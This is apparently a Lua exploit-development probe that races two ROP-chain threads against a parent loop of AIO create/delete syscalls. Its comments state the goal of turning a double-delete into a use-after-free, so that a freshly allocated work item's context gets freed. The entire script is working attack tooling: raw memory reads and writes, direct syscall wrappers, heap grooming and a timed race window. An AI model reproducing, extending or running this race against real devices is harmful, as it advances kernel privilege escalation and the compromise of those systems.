-- CRASH_CLASS: HIGH
-- PROBE 666a: aim the aio delete free window at a reallocated work item.
-- 641a showed two chains deleting one 2-item block both report 0, which means
-- the loser read [W+0x18] from an already-freed W. If a create burst takes that
-- chunk in the four instructions before the slot pointer is cleared, the loser
-- frees the new object's context instead. This probe runs the delete chains and
-- a create/delete burst in the parent at the same time.
print("=== PROBE 666a: AIO DELETE WINDOW VS CREATE BURST ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local BLOCKS=24
local data=memory.alloc(0x2000)
local out=memory.alloc(8)
local sc669=mk(669); local sc664=mk(664); local sc662=mk(662); local sc454=mk(454)
local function cblock()
  wd(N(out),0)
  local r=N(select(2,pcall(function() return sc669(U(0x1001),U(N(data)),U(2),U(1),U(N(out)),U(0)) end)))
  return r, rd(N(out)) or 0
end
local base={}
local made=0
for b=1,BLOCKS do
  local r,id=cblock()
  if r~=0 then break end
  base[b]=id; made=made+1
end
print(string.format("[A] blocks created=%d base0=%X",made,base[1] or 0))
if made==0 then return end
local function ids_of(b) local id=base[b]; return id, id+0x10000 end
local function poll(id)
  local p=memory.alloc(8); wd(N(p),id)
  local s=memory.alloc(8); wd(N(s),0)
  local r=N(select(2,pcall(function() return sc664(U(N(p)),U(1),U(N(s)),U(0),U(0),U(0)) end)))
  return r, rd(N(s))
end
local ok=0
for b=1,made do local i0,i1=ids_of(b); local _,s0=poll(i0); local _,s1=poll(i1); if s0==3 then ok=ok+1 end; if s1==3 then ok=ok+1 end end
print(string.format("[B] items polled-3=%d of %d",ok,made*2))
local W=memory.alloc(8); wd(N(W),0)
local function delchain()
  local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x80000})
  c:push_syscall_with_ret(sc454,U(N(W)),U(2),U(0))
  for b=1,made do
    local i0,i1=ids_of(b)
    for _,id in ipairs({i0,i1}) do
      local idp=memory.alloc(8); wd(N(idp),id)
      local stp=memory.alloc(8); wd(N(stp),0x77777777)
      c:push_syscall(sc662,U(N(idp)),U(1),U(N(stp)))
    end
  end
  return c
end
print("[C] building two delete chains")
local t1=thread:new(delchain()); local t2=thread:new(delchain())
print("[D] starting")
t1:run(true); t2:run(true)
wd(N(W),1)
pcall(function() sc454(U(N(W)),U(3),U(0x7fffffff),U(0),U(0),U(0)) end)
-- burst allocations in the parent while the chains run
local burst=0; local faults=0
for round=1,40 do
  wd(N(out),0)
  local r,id=N(select(2,pcall(function() return sc669(U(0x1001),U(N(data)),U(64),U(1),U(N(out)),U(0)) end))), rd(N(out)) or 0
  if r==0 then
    burst=burst+1
    local p=memory.alloc(8); wd(N(p),id)
    local s=memory.alloc(8); wd(N(s),0)
    pcall(function() sc664(U(N(p)),U(1),U(N(s)),U(0),U(0),U(0)) end)
    wd(N(s),0)
    pcall(function() sc662(U(N(p)),U(1),U(N(s)),U(0),U(0),U(0)) end)
    if rd(N(s))~=0 then faults=faults+1 end
  end
end
print(string.format("[E] bursts=%d burst-delete-refused=%d",burst,faults))
pcall(function() t1:join() end); pcall(function() t2:join() end)
print("[F] chains joined")
local odd=0
for b=1,made do
  local i0,i1=ids_of(b)
  for _,id in ipairs({i0,i1}) do
    local r,s=poll(id)
    if s~=3 and s~=0x80020003 then odd=odd+1; print(string.format("[G] id %X state=%X",id,s or 0)) end
  end
end
print(string.format("[H] residual states=%d",odd))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
